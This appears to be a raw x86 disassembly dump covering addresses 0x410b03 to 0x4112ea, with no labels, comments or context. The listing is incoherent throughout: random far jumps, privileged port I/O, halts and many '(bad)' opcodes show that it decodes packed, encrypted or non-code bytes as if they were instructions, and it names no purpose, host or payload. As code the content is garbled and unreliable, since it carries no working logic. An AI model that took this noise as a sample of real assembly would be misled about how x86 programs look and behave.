  410b03:	xor    BYTE PTR [edx+ebp*1],bh
  410b06:	pop    ecx
  410b07:	sbb    bl,BYTE PTR [ecx+0x78d116cf]
  410b0d:	fadd   QWORD PTR [edi]
  410b0f:	or     eax,0x195324
  410b14:	inc    esp
  410b15:	sbb    DWORD PTR [edi-0x6a],ebp
  410b18:	aas    
  410b19:	jno    0x410ae1
  410b1b:	jecxz  0x410b82
  410b1d:	push   0xa89025c1
  410b22:	adc    DWORD PTR [esp+ebp*1],edi
  410b25:	and    ch,BYTE PTR [ecx-0x3e]
  410b28:	xor    al,0x94
  410b2a:	jl     0x410b93
  410b2c:	fbld   TBYTE PTR [esi-0x16]
  410b2f:	xor    eax,0x17c219b8
  410b34:	push   edi
  410b35:	sbb    al,0xa0
  410b37:	push   esp
  410b38:	add    eax,0xef21bdf9
  410b3d:	push   0xfcdedd70
  410b42:	cmc    
  410b43:	sbb    BYTE PTR [esp+esi*2-0xa],0x9c
  410b48:	mov    bl,0x3c
  410b4a:	inc    ebp
  410b4b:	push   ebx
  410b4c:	pushf  
  410b4d:	hlt    
  410b4e:	ja     0x410b66
  410b50:	adc    eax,0x6bc126e2
  410b55:	call   0x85ce2ea9
  410b5a:	fcom   st(0)
  410b5c:	xchg   edx,eax
  410b5d:	ins    DWORD PTR es:[edi],dx
  410b5e:	or     edi,DWORD PTR [eax]
  410b60:	fucomp st(5)
  410b62:	xor    BYTE PTR [eax-0x1b78d4f8],bh
  410b68:	cmp    eax,0xff48585c
  410b6d:	cmp    al,0x7c
  410b6f:	aaa    
  410b70:	xchg   ebx,eax
  410b71:	test   al,0x78
  410b73:	inc    ecx
  410b74:	add    esi,DWORD PTR [ebx+eax*1-0x1f]
  410b78:	dec    edx
  410b79:	jle    0x410b6b
  410b7b:	mov    ds:0x3df9dec3,eax
  410b80:	fild   DWORD PTR [ebp+0x5871ee04]
  410b86:	pusha  
  410b87:	in     al,dx
  410b88:	aas    
  410b89:	xchg   DWORD PTR [ebp+0x3d2eacee],ebp
  410b8f:	or     BYTE PTR [esi+0x2d4ac48f],cl
  410b95:	rcr    dl,0x17
  410b98:	addr16 adc dh,0xcc
  410b9c:	push   ebx
  410b9d:	popf   
  410b9e:	mov    al,ds:0x2561ec9e
  410ba3:	je     0x410b59
  410ba5:	fdivr  QWORD PTR [ebx]
  410ba7:	test   BYTE PTR [esi],0x20
  410baa:	xchg   ecx,eax
  410bab:	mov    eax,ds:0x408dc145
  410bb0:	xor    ch,BYTE PTR [ecx+0x4a]
  410bb3:	sub    ah,al
  410bb5:	cmp    eax,0x767c1915
  410bba:	cmp    al,0xa0
  410bbc:	imul   DWORD PTR [edx]
  410bbe:	imul   ecx,DWORD PTR [esi],0x59c3ef8e
  410bc4:	jmp    0x3423:0xea531164
  410bcb:	cmp    DWORD PTR [ecx+0x21ecfbcd],0x67
  410bd2:	ins    DWORD PTR es:[edi],dx
  410bd3:	push   esp
  410bd4:	push   0xfffffff3
  410bd6:	add    al,0xb3
  410bd8:	repnz gs adc al,0xec
  410bdc:	push   es
  410bdd:	cmp    edx,esi
  410bdf:	neg    ch
  410be1:	mov    ?,WORD PTR [ebx-0x76f4d99c]
  410be7:	sti    
  410be8:	xlat   BYTE PTR ds:[ebx]
  410be9:	mov    DWORD PTR [ebx+0x231a6cac],0x3ded171c
  410bf3:	test   al,0x99
  410bf5:	and    eax,0xb158f2ee
  410bfa:	cmp    BYTE PTR [edi],al
  410bfc:	dec    eax
  410bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bfe:	sbb    esp,DWORD PTR [eax]
  410c00:	out    dx,al
  410c01:	xchg   ebp,eax
  410c02:	imul   edi,DWORD PTR [esi-0xb],0x24
  410c06:	imul   edx,DWORD PTR [esi+0x8bbebe8],0xffffffdb
  410c0d:	lock add DWORD PTR [esp+eax*4],edi
  410c11:	xor    al,0x33
  410c13:	loope  0x410c08
  410c15:	add    DWORD PTR [eax-0x5fe55ac9],0xad506218
  410c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c20:	(bad)  
  410c22:	div    cl
  410c24:	out    0x23,eax
  410c26:	xor    bh,BYTE PTR ds:0xf4725097
  410c2c:	push   edi
  410c2d:	arpl   WORD PTR [esi],dx
  410c2f:	lods   eax,DWORD PTR ds:[esi]
  410c30:	jne    0x410c32
  410c32:	(bad)  
  410c33:	(bad)  
  410c34:	ds mov esp,0x4fef0a1b
  410c3a:	pop    es
  410c3b:	pop    esp
  410c3c:	dec    esi
  410c3d:	pop    edi
  410c3e:	xlat   BYTE PTR ds:[ebx]
  410c3f:	shl    edx,cl
  410c41:	repz dec ebx
  410c43:	jmp    0xa5269a2b
  410c48:	stc    
  410c49:	adc    BYTE PTR [ecx+edx*2+0xc],0x71
  410c4e:	jge    0x410c57
  410c50:	fnstsw WORD PTR [edi]
  410c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c53:	or     DWORD PTR ds:0x947788cf,ecx
  410c59:	leave  
  410c5a:	inc    edx
  410c5b:	idiv   BYTE PTR [ebx+0x6d8932b2]
  410c61:	mov    eax,ds:0x91b4d950
  410c66:	inc    ecx
  410c67:	inc    esi
  410c68:	lea    esi,[ecx+0x6e5f3f12]
  410c6e:	repz rol BYTE PTR [ebx+ebp*8+0x43],0x57
  410c74:	add    al,0x73
  410c76:	ja     0x410c44
  410c78:	ins    DWORD PTR es:[edi],dx
  410c79:	fwait
  410c7a:	cs jb  0x410c19
  410c7d:	inc    eax
  410c7e:	stc    
  410c7f:	aaa    
  410c80:	ins    BYTE PTR es:[edi],dx
  410c81:	mov    ah,0x7e
  410c83:	dec    ebp
  410c84:	out    0xc1,eax
  410c86:	mov    bh,BYTE PTR [edi+eiz*2-0xc]
  410c8a:	ret    0x96ac
  410c8d:	xchg   edi,eax
  410c8e:	mov    al,BYTE PTR [ebx-0x4f485d3e]
  410c94:	pop    edi
  410c95:	fmul   st(3),st
  410c97:	ins    DWORD PTR es:[edi],dx
  410c98:	stos   BYTE PTR es:[edi],al
  410c99:	jnp    0x410cff
  410c9b:	data16 sub al,0x76
  410c9e:	gs xchg esp,eax
  410ca0:	in     eax,dx
  410ca1:	mov    WORD PTR [ebp+0x1b],?
  410ca4:	js     0x410c32
  410ca6:	xlat   BYTE PTR ds:[ebx]
  410ca7:	into   
  410ca8:	dec    edx
  410ca9:	cmc    
  410caa:	test   DWORD PTR [ebp+0x733fd2b0],esi
  410cb0:	xchg   ebx,eax
  410cb1:	push   ebx
  410cb2:	cmp    DWORD PTR [esi-0x7],edi
  410cb5:	pop    ebp
  410cb6:	aam    0xf6
  410cb8:	or     ch,BYTE PTR [ebx-0x7f]
  410cbb:	ins    BYTE PTR es:[edi],dx
  410cbc:	jb     0x410cdb
  410cbe:	fwait
  410cbf:	call   0xf2da282a
  410cc4:	and    bl,BYTE PTR [ebx-0x5]
  410cc7:	sbb    ecx,DWORD PTR [ebx+esi*2-0x2c]
  410ccb:	fnsave [ecx-0x2c18b242]
  410cd1:	sbb    edi,esi
  410cd3:	sub    BYTE PTR [eax+0x3a],ah
  410cd6:	aas    
  410cd7:	mov    ds:0xbb7df933,al
  410cdc:	test   BYTE PTR ds:0x3659c6b5,dh
  410ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce3:	xchg   edi,eax
  410ce4:	fld    st(0)
  410ce6:	sbb    DWORD PTR [eax-0x2c3997b8],esi
  410cec:	dec    eax
  410ced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cee:	pop    ebx
  410cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf0:	cmp    al,dl
  410cf2:	xor    ebp,DWORD PTR [eax+0x29]
  410cf5:	xchg   esi,eax
  410cf6:	push   esp
  410cf7:	inc    ebx
  410cf8:	mov    ch,bh
  410cfa:	adc    DWORD PTR [esi+0x40],esp
  410cfd:	not    BYTE PTR [edi+0x12fc02d1]
  410d03:	out    dx,eax
  410d04:	jp     0x410d04
  410d06:	dec    edx
  410d07:	ror    cl,1
  410d09:	ins    BYTE PTR es:[edi],dx
  410d0a:	mov    bl,0x45
  410d0c:	mov    ah,0x2a
  410d0e:	add    BYTE PTR [edx],bl
  410d10:	in     eax,dx
  410d11:	and    eax,0xe173a866
  410d16:	sar    BYTE PTR ds:0x39cc5b2,0xd6
  410d1d:	pop    ss
  410d1e:	xchg   edx,eax
  410d1f:	jmp    0x1fd8:0x1b6db6d9
  410d26:	xlat   BYTE PTR ds:[ebx]
  410d27:	xor    ebp,DWORD PTR [ecx]
  410d29:	ffree  st(5)
  410d2b:	js     0x410d66
  410d2d:	lock pop edi
  410d2f:	adc    DWORD PTR [ebp+0x59e3cfbf],ecx
  410d35:	imul   edx,DWORD PTR [esi+0x4e],0xe
  410d39:	jne    0x410cfb
  410d3b:	daa    
  410d3c:	pusha  
  410d3d:	mov    ch,0x14
  410d3f:	push   0xffffffe7
  410d41:	jns    0x410d3f
  410d43:	or     BYTE PTR [ebx],0x12
  410d46:	pop    esi
  410d47:	enter  0xa4f5,0x70
  410d4b:	mov    ah,0x8e
  410d4d:	or     al,0x93
  410d4f:	mov    ah,0xfc
  410d51:	loope  0x410d55
  410d53:	dec    esi
  410d54:	mov    cl,0xee
  410d56:	sbb    bh,ah
  410d58:	iret   
  410d59:	mov    esi,0x111fa9b5
  410d5e:	or     dl,BYTE PTR [ebp+edx*1-0x4c]
  410d62:	iret   
  410d63:	add    eax,0xbf974805
  410d68:	xchg   ecx,eax
  410d69:	int    0xf6
  410d6b:	mov    BYTE PTR ds:0x5df3248c,al
  410d71:	in     al,dx
  410d72:	(bad)  
  410d74:	push   es
  410d75:	jbe    0x410de5
  410d77:	sub    BYTE PTR [eax-0x2],dh
  410d7a:	cmp    DWORD PTR ds:0x313b3086,ebx
  410d80:	cmp    eax,DWORD PTR [ebx-0x6e071f33]
  410d86:	aaa    
  410d87:	mov    ch,0x5d
  410d89:	adc    BYTE PTR [eax],al
  410d8b:	icebp  
  410d8c:	je     0x410dfd
  410d8e:	add    eax,0x344aec0d
  410d93:	sub    DWORD PTR [edx+0x2baefb9d],ecx
  410d99:	pop    ebp
  410d9a:	mov    eax,0x8b368581
  410d9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410da0:	imul   eax,DWORD PTR [esi+0x59],0xf0203ec4
  410da7:	xchg   ebp,eax
  410da8:	inc    BYTE PTR [ebx+edx*8]
  410dab:	inc    edi
  410dac:	mov    WORD PTR [eax-0x40],es
  410daf:	imul   esp,DWORD PTR [esi],0x23508d93
  410db5:	sbb    al,0x18
  410db7:	stos   DWORD PTR es:[edi],eax
  410db8:	jo     0x410e28
  410dba:	popf   
  410dbb:	add    BYTE PTR [edi+0x52],0x20
  410dbf:	nop    DWORD PTR [ebp+0x1287de93]
  410dc6:	retf   0xc5cb
  410dc9:	scas   eax,DWORD PTR es:[edi]
  410dca:	mov    BYTE PTR [ebx+0x11],dh
  410dcd:	push   ds
  410dce:	das    
  410dcf:	dec    edi
  410dd0:	fisttp DWORD PTR [ebx+eax*2-0x2ba385ea]
  410dd7:	fisub  WORD PTR [ecx+0x35e77794]
  410ddd:	mov    ebx,0xdc410cdf
  410de2:	icebp  
  410de3:	mov    al,bl
  410de5:	into   
  410de6:	jg     0x410df3
  410de8:	mov    ds:0x642ae33f,eax
  410ded:	or     DWORD PTR [eax-0x63b18e0e],0xa37a27a1
  410df7:	(bad)  
  410df8:	push   ss
  410df9:	retf   0xc3a2
  410dfc:	clc    
  410dfd:	ds aas 
  410dff:	shr    BYTE PTR [ebx+ebp*2-0x6190d314],1
  410e06:	or     al,0xc7
  410e08:	sub    BYTE PTR [edi-0x4869fc1f],al
  410e0e:	inc    ebx
  410e0f:	aad    0xae
  410e11:	adc    eax,0xf81fa3be
  410e16:	mov    ds:0x835c97a7,al
  410e1b:	mov    cl,0xd5
  410e1d:	push   ds
  410e1e:	push   ecx
  410e1f:	je     0x410e51
  410e21:	(bad)  
  410e22:	cmp    edi,edx
  410e24:	xchg   esp,eax
  410e25:	mov    edx,0x845de972
  410e2a:	rol    BYTE PTR [edx+0x1d],1
  410e2d:	ret    0xa8fc
  410e30:	test   eax,0x53e21ba6
  410e35:	leave  
  410e36:	(bad)  
  410e37:	adc    eax,0x20448fca
  410e3c:	sub    eax,0x125d6b19
  410e41:	in     al,0x71
  410e43:	mov    esi,0xf3d92b5d
  410e48:	push   ebp
  410e49:	jmp    0x410e9e
  410e4b:	pop    ss
  410e4c:	rcr    BYTE PTR [edx+0x2d],0xd3
  410e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e51:	scas   al,BYTE PTR es:[edi]
  410e52:	mov    ebp,0x4cb7677a
  410e57:	or     al,0xc9
  410e59:	jbe    0x410ecf
  410e5b:	sahf   
  410e5c:	push   es
  410e5d:	mov    BYTE PTR [eax],ch
  410e5f:	and    ch,bl
  410e61:	ficomp WORD PTR [edi-0xcdd51c5]
  410e67:	mov    edi,0x5b8f9911
  410e6c:	push   ecx
  410e6d:	jmp    0x47d7:0xc336bc67
  410e74:	pop    esi
  410e75:	pop    ss
  410e76:	dec    eax
  410e77:	xchg   esi,eax
  410e78:	inc    edx
  410e79:	pop    edx
  410e7a:	cmp    esp,DWORD PTR [eax]
  410e7c:	cmp    cl,cl
  410e7e:	es cmp al,0xfc
  410e81:	jge    0x410e3f
  410e83:	inc    edi
  410e84:	sbb    al,0x96
  410e86:	dec    ebp
  410e87:	dec    esp
  410e88:	inc    ebp
  410e89:	jmp    0x6da0:0xfb0bef0d
  410e90:	retf   
  410e91:	ds adc al,0xe2
  410e94:	int3   
  410e95:	jmp    0xfcbe:0x6a2a4d1a
  410e9c:	xor    eax,0xdca3ebc1
  410ea1:	cwde   
  410ea2:	icebp  
  410ea3:	clc    
  410ea4:	cmc    
  410ea5:	(bad)  
  410ea6:	fmul   DWORD PTR [ebx-0x4b2a0c72]
  410eac:	xor    eax,0xe265f19e
  410eb1:	xor    eax,0x4e09f15b
  410eb6:	fs ja  0x410ed4
  410eb9:	pusha  
  410eba:	push   eax
  410ebb:	cmp    ecx,DWORD PTR [edi-0x46121e13]
  410ec1:	xchg   ebp,eax
  410ec2:	call   0x570b245c
  410ec7:	xchg   BYTE PTR ds:0xd0c94d43,cl
  410ece:	test   ax,0x3256
  410ed2:	mov    ch,bh
  410ed4:	pop    esi
  410ed5:	and    eax,0xfbbafa91
  410eda:	mov    cl,0xd0
  410edc:	pop    ss
  410edd:	ret    0x5f85
  410ee0:	retf   
  410ee1:	mov    eax,ds:0x77fbeec9
  410ee6:	jae    0x410ef4
  410ee8:	scas   eax,DWORD PTR es:[edi]
  410ee9:	push   ebp
  410eea:	mov    dl,0xa8
  410eec:	mov    al,ds:0x3532d7a6
  410ef1:	out    0x9,eax
  410ef3:	inc    edi
  410ef4:	pop    ecx
  410ef5:	sbb    cl,BYTE PTR [esi+ebp*1+0x1affbdd4]
  410efc:	inc    edx
  410efd:	shl    DWORD PTR [ecx-0x136202b5],1
  410f03:	or     eax,0x9b711592
  410f08:	push   es
  410f09:	adc    al,0x19
  410f0b:	repnz ins DWORD PTR es:[edi],dx
  410f0d:	jae    0x410ebb
  410f0f:	pop    es
  410f10:	and    esi,DWORD PTR [ebx+ebp*2]
  410f13:	sbb    ah,BYTE PTR [edx-0x30]
  410f16:	out    0x5f,al
  410f18:	cld    
  410f19:	sti    
  410f1a:	add    ebp,edi
  410f1c:	jp     0x410f1c
  410f1e:	hlt    
  410f1f:	nop
  410f20:	jge    0x410ee2
  410f22:	sahf   
  410f23:	js     0x410edc
  410f25:	fwait
  410f26:	pop    esi
  410f27:	or     al,0xcf
  410f29:	retf   
  410f2a:	dec    ebp
  410f2b:	cmp    eax,0x95fea69d
  410f30:	inc    edi
  410f31:	jne    0x410f71
  410f33:	popf   
  410f34:	and    DWORD PTR [ebx+0x67],ebx
  410f37:	xchg   edi,eax
  410f38:	ret    0xb1de
  410f3b:	je     0x410f73
  410f3d:	jecxz  0x410f7a
  410f3f:	inc    esi
  410f40:	les    ebp,FWORD PTR [esi+eax*2+0x7be5a08a]
  410f47:	sub    eax,0x540b7fe0
  410f4c:	fadd   DWORD PTR [ebx-0x6238b826]
  410f52:	jmp    0x9613:0x469fc9da
  410f59:	add    BYTE PTR [edi],ah
  410f5b:	pop    ss
  410f5c:	sub    bh,BYTE PTR [ebx-0x52]
  410f5f:	fs xor ah,bl
  410f62:	xlat   BYTE PTR ds:[ebx]
  410f63:	out    dx,al
  410f64:	hlt    
  410f65:	bound  esi,QWORD PTR [esi-0x44]
  410f68:	dec    esp
  410f69:	jne    0x410f17
  410f6b:	mov    DWORD PTR [edx+edx*4-0x6f74babb],ecx
  410f72:	aam    0xfd
  410f74:	pop    edx
  410f75:	cli    
  410f76:	push   0xfffffff3
  410f78:	cli    
  410f79:	out    0xc9,eax
  410f7b:	or     ah,BYTE PTR [esi+0xa]
  410f7e:	nop
  410f7f:	jno    0x410f07
  410f81:	mov    ecx,0x127b4d9b
  410f86:	adc    ebp,DWORD PTR ds:0xa76e84eb
  410f8c:	ret    
  410f8d:	test   BYTE PTR [ebp+0x4fda8082],dh
  410f93:	test   BYTE PTR [ebp+0x73095128],bl
  410f99:	push   0x9a746f47
  410f9e:	push   esi
  410f9f:	pop    esi
  410fa0:	enter  0xe9d9,0xfe
  410fa4:	(bad)  
  410fa6:	sub    ch,cl
  410fa8:	retf   0x1cad
  410fab:	stc    
  410fac:	fwait
  410fad:	in     eax,0x7
  410faf:	in     al,0xc0
  410fb1:	mov    edx,0x9151dd1f
  410fb6:	jb     0x410f43
  410fb8:	jae    0x410fef
  410fba:	arpl   WORD PTR [ebx],bp
  410fbc:	loopne 0x410fe3
  410fbe:	and    eax,0x3c615fa2
  410fc3:	cmp    DWORD PTR [ebx+0x10fff837],0x44e2dc40
  410fcd:	retf   0x583c
  410fd0:	sbb    ecx,eax
  410fd2:	or     al,0x51
  410fd4:	mov    dh,0xc7
  410fd6:	(bad)  
  410fd8:	xchg   esi,eax
  410fd9:	fwait
  410fda:	aad    0x9a
  410fdc:	jbe    0x41100d
  410fde:	cmp    DWORD PTR [edi+edx*2+0x2871327f],esi
  410fe5:	mov    dh,0x7
  410fe7:	adc    bl,BYTE PTR [ebx]
  410fe9:	inc    ebx
  410fea:	xchg   ebp,eax
  410feb:	data16 and bl,BYTE PTR [ebp+0x30]
  410fef:	jp     0x41102a
  410ff1:	sub    al,0xe9
  410ff3:	hlt    
  410ff4:	add    eax,0xb9964987
  410ff9:	sub    BYTE PTR [ebp+0x71],al
  410ffc:	mov    bh,0x49
  410ffe:	or     DWORD PTR [eax+edx*1+0x575a66ea],edi
  411005:	or     ah,bh
  411007:	jns    0x410fb1
  411009:	xchg   ecx,eax
  41100a:	(bad)  
  41100b:	stos   BYTE PTR es:[edi],al
  41100c:	stos   DWORD PTR es:[edi],eax
  41100d:	mov    al,ds:0xe09bdd3c
  411012:	lea    edi,[esi]
  411014:	popa   
  411015:	lods   eax,DWORD PTR ds:[esi]
  411016:	push   si
  411018:	or     DWORD PTR [ebx],esi
  41101a:	test   dl,dh
  41101c:	mov    ebx,0x56689900
  411021:	jnp    0x41103f
  411023:	ror    BYTE PTR [edi],0x10
  411026:	pop    esi
  411027:	adc    eax,0x9d0742cb
  41102c:	daa    
  41102d:	dec    esi
  41102e:	cli    
  41102f:	mov    bl,0x52
  411031:	pop    ds
  411032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411033:	xor    al,0x9d
  411035:	jbe    0x410fdb
  411037:	test   BYTE PTR [esi],ch
  411039:	dec    esp
  41103a:	loope  0x41108d
  41103c:	dec    ebp
  41103d:	xchg   ecx,eax
  41103e:	ja     0x41108f
  411040:	gs xor esi,esi
  411043:	dec    esp
  411044:	lock stc 
  411046:	test   BYTE PTR [edi+0x71ecabde],cl
  41104c:	push   esi
  41104d:	imul   edi,DWORD PTR [ebx-0x4c],0xaac51c1f
  411054:	outs   dx,BYTE PTR ds:[esi]
  411055:	shrd   edi,edx,0xf8
  411059:	mov    ebp,0x6db2c910
  41105e:	xchg   edx,eax
  41105f:	popa   
  411060:	repz and ch,bh
  411063:	shr    BYTE PTR [ecx],0x3c
  411066:	xor    al,0x57
  411068:	mov    BYTE PTR [edi+0x2551d31b],ah
  41106e:	mov    ds:0xd3c3193d,al
  411074:	inc    eax
  411075:	add    ebx,DWORD PTR ds:0x7e157518
  41107b:	or     edi,DWORD PTR [ebx-0x37]
  41107e:	fisub  DWORD PTR [edx-0x37]
  411081:	shl    BYTE PTR [eax+0x75],1
  411084:	test   DWORD PTR [edi+0x20],eax
  411087:	inc    ecx
  411088:	test   DWORD PTR [esi],ebx
  41108a:	inc    ecx
  41108b:	and    ch,ch
  41108d:	or     DWORD PTR [ecx-0x603f1d8c],eax
  411093:	ja     0x411021
  411095:	or     DWORD PTR [ebx],edx
  411097:	(bad)  
  411098:	pop    esi
  411099:	pop    edi
  41109a:	test   BYTE PTR [edx],bl
  41109c:	mov    DWORD PTR [edi-0x46700c17],ebx
  4110a2:	lea    esi,[ebp+esi*2-0x4e]
  4110a6:	call   0x6290:0x8e0fb605
  4110ad:	repz cwde 
  4110af:	jb     0x4110bd
  4110b1:	mov    ecx,ebx
  4110b3:	cmp    al,0xc
  4110b5:	pushf  
  4110b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b7:	ds stc 
  4110b9:	adc    cl,BYTE PTR [edi-0x1b280677]
  4110bf:	pop    ss
  4110c0:	inc    esp
  4110c1:	pop    ds
  4110c2:	mov    esp,0x72ae18ed
  4110c7:	stos   DWORD PTR es:[edi],eax
  4110c8:	mov    ah,0xcb
  4110ca:	mov    esp,0xea2b3665
  4110cf:	gs in  al,0x24
  4110d2:	ret    
  4110d3:	and    al,0xf9
  4110d5:	pop    esi
  4110d6:	repz jecxz 0x4110b8
  4110d9:	or     ah,bh
  4110db:	adc    al,0xd0
  4110dd:	popf   
  4110de:	xchg   ebp,eax
  4110df:	loopne 0x4110c9
  4110e1:	push   ss
  4110e2:	pop    eax
  4110e3:	ins    BYTE PTR es:[edi],dx
  4110e4:	xor    DWORD PTR [eax+0x8],esp
  4110e7:	outs   dx,DWORD PTR ds:[esi]
  4110e8:	imul   DWORD PTR [edx+0x11]
  4110eb:	sar    BYTE PTR [ebx],1
  4110ed:	jo     0x4110e5
  4110ef:	ja     0x411077
  4110f1:	sub    DWORD PTR [ecx-0x16],0xdeffbfdc
  4110f8:	stc    
  4110f9:	xchg   ebp,eax
  4110fa:	pusha  
  4110fb:	ret    
  4110fc:	inc    edi
  4110fd:	xchg   edi,eax
  4110fe:	sahf   
  4110ff:	sub    BYTE PTR [edx+esi*1-0x7eea7253],al
  411106:	(bad)  
  411107:	std    
  411108:	outs   dx,DWORD PTR ds:[esi]
  411109:	enter  0x1bc8,0xb6
  41110d:	into   
  41110e:	or     BYTE PTR [edi+0x27f29644],bl
  411114:	xor    BYTE PTR ds:0xeeecbc4b,dl
  41111a:	pop    esi
  41111b:	in     eax,0x9e
  41111d:	out    0x20,al
  41111f:	inc    edx
  411120:	rcr    BYTE PTR [ebx-0x7c],1
  411123:	push   ds
  411124:	inc    eax
  411125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411126:	mov    ebp,0x9926fca
  41112b:	pop    esp
  41112c:	mov    eax,0x193f1c1d
  411131:	pop    esp
  411132:	mov    dx,0x1011
  411136:	fidivr WORD PTR [ebp+0x1a]
  411139:	dec    edx
  41113a:	test   BYTE PTR [di],0x16
  41113e:	push   ecx
  41113f:	mul    cl
  411141:	icebp  
  411142:	das    
  411143:	dec    ebx
  411144:	ds dec ebp
  411146:	mov    BYTE PTR [esi+0x66],al
  411149:	inc    DWORD PTR [ebp-0x3b6b7429]
  41114f:	(bad)  
  411150:	mov    al,ds:0x39601802
  411155:	cs adc eax,0x261d8193
  41115b:	push   esp
  41115c:	mov    bl,0xa
  41115e:	inc    esi
  41115f:	mov    eax,0xe8920d48
  411164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411165:	stos   BYTE PTR es:[edi],al
  411166:	ins    BYTE PTR es:[edi],dx
  411167:	in     al,0x2a
  411169:	neg    edx
  41116b:	cs adc eax,edi
  41116e:	or     BYTE PTR [esi+0x1029f7b5],cl
  411174:	and    eax,0x7f7c5d95
  411179:	and    eax,0x43a962c0
  41117e:	push   0x22
  411180:	and    eax,0xdf9d4585
  411185:	pop    edx
  411186:	cmp    DWORD PTR [edx+0x26469ee8],esi
  41118c:	pop    eax
  41118d:	mov    bl,BYTE PTR [ebp+edx*8-0x42]
  411191:	mov    gs,WORD PTR [ebx-0x74]
  411194:	inc    edx
  411195:	xor    DWORD PTR [ebx-0x16],0xffffff84
  411199:	push   0xd72f17a9
  41119e:	jbe    0x41114c
  4111a0:	in     al,dx
  4111a1:	mov    ah,0x8b
  4111a3:	cmp    eax,0x3acb8d1c
  4111a8:	pop    eax
  4111a9:	std    
  4111aa:	sub    DWORD PTR [ebx-0x6447d84b],esp
  4111b0:	je     0x411166
  4111b2:	fdiv   st,st(6)
  4111b4:	mov    ds:0x8ac3b9f0,eax
  4111b9:	retf   
  4111ba:	loopne 0x411170
  4111bc:	mov    ds:0x66dd05e2,eax
  4111c1:	test   eax,0xbf8ba63b
  4111c6:	ins    BYTE PTR es:[edi],dx
  4111c7:	out    0x45,al
  4111c9:	inc    edi
  4111ca:	xor    dh,BYTE PTR [esi]
  4111cc:	outs   dx,BYTE PTR ds:[esi]
  4111cd:	in     eax,0xe8
  4111cf:	pop    ecx
  4111d0:	psrad  mm0,QWORD PTR [eax]
  4111d3:	loop   0x4111e1
  4111d5:	or     eax,0x24dfa9a0
  4111da:	jp     0x41121e
  4111dc:	pop    ecx
  4111dd:	jo     0x41120d
  4111df:	loope  0x411198
  4111e1:	jae    0x411178
  4111e3:	fcmovnb st,st(0)
  4111e5:	repnz inc cx
  4111e8:	or     BYTE PTR [eax+0x2d],0xbd
  4111ec:	add    bl,BYTE PTR [eax+0x27]
  4111ef:	inc    ecx
  4111f0:	cmp    BYTE PTR [edi],ah
  4111f2:	adc    BYTE PTR [ebx-0x3d],bl
  4111f5:	sub    DWORD PTR [ebp-0x1e],0x7e6967e7
  4111fc:	dec    esp
  4111fd:	ret    
  4111fe:	fistp  WORD PTR ds:[ebx+0x76b682fe]
  411205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411206:	fdiv   DWORD PTR [ebp+0x6b]
  411209:	in     eax,dx
  41120a:	test   DWORD PTR [esi+0x766407c3],0x198120c
  411214:	add    eax,0x803f223b
  411219:	push   ebx
  41121a:	test   al,bh
  41121c:	mov    WORD PTR [edi-0x7b90e6b2],ss
  411222:	sbb    eax,0x48bf86ae
  411227:	jl     0x4111cf
  411229:	xchg   edi,eax
  41122a:	or     BYTE PTR [edx+0x5abeec9f],cl
  411230:	inc    edx
  411231:	pop    eax
  411232:	or     BYTE PTR [esi-0x3e3aa5ce],0xda
  411239:	pop    ds
  41123a:	retf   0x4367
  41123d:	push   0xd94500ab
  411242:	inc    ebp
  411243:	js     0x411253
  411245:	pop    ds
  411246:	jmp    0x178b:0x3eb6158c
  41124d:	jae    0x41127f
  41124f:	xor    ebp,DWORD PTR [edx-0x7a32b091]
  411255:	ficomp WORD PTR [ecx]
  411257:	fstp   QWORD PTR [ebp-0x548dd757]
  41125d:	fcom   QWORD PTR [edi]
  41125f:	jnp    0x4112a3
  411261:	out    0xde,eax
  411263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411264:	push   es
  411265:	push   eax
  411266:	out    dx,al
  411267:	mov    esp,0xb5a323f6
  41126c:	push   cs
  41126d:	dec    ebp
  41126e:	lea    ebx,[ebx+0x7f]
  411271:	jmp    0xda98:0x3277ef2c
  411278:	sub    al,0xfb
  41127a:	cdq    
  41127b:	rcr    BYTE PTR [eax],1
  41127d:	cmp    ch,BYTE PTR [ebp+0xca701d2]
  411283:	js     0x411251
  411285:	das    
  411286:	adc    DWORD PTR [ecx],0xcb60328
  41128c:	xor    ecx,edx
  41128e:	fs push ds
  411290:	jmp    0x4112b9
  411292:	cmp    eax,0x781b90e7
  411297:	add    al,0x6
  411299:	les    edx,FWORD PTR [ecx+0x60a51625]
  41129f:	jae    0x411277
  4112a1:	cmc    
  4112a2:	call   DWORD PTR [esi+0x6cc0b940]
  4112a8:	js     0x4112b4
  4112aa:	pop    edi
  4112ab:	std    
  4112ac:	jg     0x4112c1
  4112ae:	int    0x2e
  4112b0:	leave  
  4112b1:	mov    ah,0x98
  4112b3:	std    
  4112b4:	inc    edx
  4112b5:	int3   
  4112b6:	fldcw  WORD PTR [ebx+eiz*8]
  4112b9:	loope  0x41126e
  4112bb:	sub    dl,dh
  4112bd:	xchg   cl,cl
  4112bf:	pushf  
  4112c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112c1:	shr    ebx,cl
  4112c3:	mov    esi,0xf304af30
  4112c8:	mov    edx,eax
  4112ca:	bound  ebp,QWORD PTR [edx+ebx*2]
  4112cd:	or     eax,DWORD PTR [edi]
  4112cf:	f2xm1  
  4112d1:	ret    
  4112d2:	push   ds
  4112d3:	sbb    al,0x2
  4112d5:	jg     0x41131e
  4112d7:	aaa    
  4112d8:	cs jl  0x411266
  4112db:	int    0x78
  4112dd:	adc    dh,BYTE PTR [eax]
  4112df:	sub    dl,BYTE PTR [eax]
  4112e1:	out    dx,eax
  4112e2:	jnp    0x411341
  4112e4:	adc    DWORD PTR [eax],esp
  4112e6:	jns    0x411306
  4112e8:	mov    ah,0x18
  4112ea:	inc    eax
